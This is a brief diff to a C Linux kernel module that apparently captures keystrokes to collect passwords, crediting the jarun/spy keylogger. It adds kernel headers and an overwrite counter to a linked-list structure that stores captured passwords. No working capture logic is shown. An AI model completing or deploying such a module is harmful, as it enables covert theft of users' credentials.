@@ -4,6 +4,15 @@
 /* Git this keymap from:
  * 	https://github.com/jarun/spy/blob/master/spy.c
  */
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/interrupt.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <linux/keyboard.h>
+#include <asm/uaccess.h>
+#include <asm/io.h>
+#include <linux/slab.h>
 
 
 extern int password_count;
@@ -51,8 +60,9 @@ int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data)
 int init (void);
 void cleanup(void);
 
-struct password{//23 byte struct
+struct password{//27 byte struct
 	char* pw; // The passwords won't be longer than 15 characters
+	int overwrite_num;
 	struct password* next;
 };
 
